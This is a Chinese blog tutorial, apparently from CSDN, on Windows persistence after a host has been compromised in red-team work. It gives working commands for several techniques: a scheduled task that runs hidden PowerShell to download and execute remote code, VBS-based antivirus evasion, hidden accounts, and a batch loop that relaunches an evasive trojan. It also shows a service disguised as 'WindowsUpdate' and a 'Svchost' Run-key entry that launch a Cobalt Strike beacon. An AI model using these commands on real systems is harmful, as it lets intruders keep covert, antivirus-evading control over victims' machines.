**目录**

[定时任务](#t0 "定时任务")

[创建隐蔽账号](#t1 "创建隐蔽账号")

[进程迁移](#t2 "进程迁移")

[启动目录](#t3 "启动目录")

[注册服务自启(报毒)](#t4 "注册服务自启(报毒)")

[修改注册表实现自启动](#t5 "修改注册表实现自启动")

* * *

在红蓝对抗实战中，当我们获取到一台Windows主机的权限后，首先要做的就是怎么维持住该权限。因为防守方的实力也在不断增强，并且他们的流量监测设备也在不断监控，如果发现机器被植入[木马](https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020)，他们肯定会采取措施。

比如采取以下几点措施：

*   查杀木马进程
*   重启主机
*   断网
*   关闭主机

而对于我们维持权限，可以有以下几点：

### 定时任务

使用 schtasks 命令创建定时任务

```
在目标主机上创建一个名为test的计划任务，启动程序为C:\vps.exe，启动权限为system，启动时间为每隔一小时启动一次。当执行完该命令，该计划任务就已经启动了      
schtasks /create /tn test /sc HOURLY /mo 1 /tr c:\vps.exe /ru system /f       
其他启动时间参数：      
/sc onlogon  用户登录时启动      
/sc onstart  系统启动时启动      
/sc onidle   系统空闲时启动       
但是如果是powershell命令的话，执行完下面的命令，还需要执行启动该计划任务的命令      1
schtasks /create /tn test /sc HOURLY /mo 1 /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://xx.xx.xx.xx'''))'" /ru system /f       1
查询该test计划任务      1
schtasks /query | findstr test       1
启动该test计划任务      1
schtasks /run /i /tn "test"       1
删除该test计划任务      1
schtasks /delete /tn "test" /f
```


如果当期用户权限是普通权限那么 /ru 参数为 %USERNAME%。

![](https://img-blog.csdnimg.cn/20200929212914449.png)

如果是管理员权限，可以指定为 system。 

![](https://img-blog.csdnimg.cn/20200929213556927.png)

但是如果目标主机有杀软的话会报毒

![](https://img-blog.csdnimg.cn/2020092921251782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

所以，要想绕过杀入软件创建计划任务的话，有这么一个思路。利用VBS脚本创建计划任务，然后执行该VBS脚本即可。实测不报毒。

![](https://img-blog.csdnimg.cn/20200929220550739.png)

传送门： [Windows中的计划任务(schtasks)](https://xie1997.blog.csdn.net/article/details/83068430#Windows%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%28schtasks%29 "Windows中的计划任务(schtasks)")

### 创建隐蔽账号

如果目标主机的3389端口开放着，则我们可以创建隐蔽账号。

或者读取该主机administrator账号密码，使用impacket工具包登录(需要目标主机开启445端口)。

![](https://img-blog.csdnimg.cn/2020052822045018.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

注意，如果目标主机上有杀软的话，创建新用户杀软会有安全提示的。

![](https://img-blog.csdnimg.cn/20200528220549612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 进程迁移

针对查杀木马进程这个措施，我们可以将木马进程迁移到系统正常的进程当中

![](https://img-blog.csdnimg.cn/20190812153718971.png)

对于查杀木马进程，我们还有一种解决办法，设置CMD定时脚本，创建隐蔽账号，登录创建的账号执行该脚本：

这个bat脚本的代码如下。我们将免杀马放在 c:\\windows\\temp 目录下，免杀马的名字改为 run.exe 

```
 @echo off        
 set INTERVAL=120      
 :Again        
 echo start server      
 C:      
 cd C:\windows\temp      
 start run.exe      
 timeout %INTERVAL%      
 goto Again
```


![](https://img-blog.csdnimg.cn/2020052822200062.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后运行这个脚本，这个脚本会每隔2分钟(120秒)执行免杀木马。

![](https://img-blog.csdnimg.cn/20200528222016590.png)

在实战中我们的利用思路是，在目标机器上创建新用户，然后在新用户下执行该bat脚本。实战中我们可以将120秒的时间适当延长，免杀马的名字也可以修改为更具有迷惑性的名字。这样，如果防守方只是杀掉了免杀马的进程，而没有杀掉我们的这个bat脚本的cmd.exe进程的话，我们的这个bat脚本还会定时执行免杀马的。

注意：执行该脚本需要远程桌面双击执行，不能直接在CobaltStrike中使用命令行执行

![](https://img-blog.csdnimg.cn/20200528222037593.png)

### 启动目录

针对重启主机，我们可以将木马放入系统的启动目录当中

```
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```


![](https://img-blog.csdnimg.cn/20200528221050241.png)

注意，如果目标主机上有杀软的话，将木马放入启动目录杀软会有安全提示的。

![](https://img-blog.csdnimg.cn/20200528221029932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 注册服务自启(报毒)

```
注册服务      
sc create "WindowsUpdate" binpath= "cmd /c start "C:\Users\Administrator\Desktop\beacon.exe""&&sc config "WindowsUpdate" start= auto&&net start  WindowsUpdate      
查询服务      
sc query WindowsUpdate      
删除服务      
sc delete WindowsUpdate
```


![](https://img-blog.csdnimg.cn/20210114125052997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 ![](https://img-blog.csdnimg.cn/20210114125243575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 修改注册表实现自启动

**命令行操作**

```
添加注册表启动项      
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Svchost /t REG_SZ /d "C:\windows\temp\test\beacon.exe " /f       
查询注册表启动项      
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v Svchost      
删除注册表启动项      
reg delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v Svchost /f
```


![](https://img-blog.csdnimg.cn/20210114124856753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 **图形化操作**

打开注册表 HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run

![](https://img-blog.csdnimg.cn/20200701153454127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

右键  新建(N) ——> 字符串值(S)

![](https://img-blog.csdnimg.cn/20200701153639231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200701153728981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200701153806476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

目标计算机重新启动后，我们即可以收到弹回来的shell

![](https://img-blog.csdnimg.cn/20200701153932220.png)

本文中的相关功能我已经集成在CS插件中，链接：[https://t.zsxq.com/7MnIAM7](https://t.zsxq.com/7MnIAM7 "https://t.zsxq.com/7MnIAM7")

![](https://img-blog.csdnimg.cn/20210426113346534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

相关文章：[使用reg管理注册表](https://xie1997.blog.csdn.net/article/details/112177550 "使用reg管理注册表")

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

文章知识点与官方知识档案匹配，可进一步学习相关知识

[CS入门技能树](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[Linux入门](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[初识Linux](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)11176 人正在系统学习中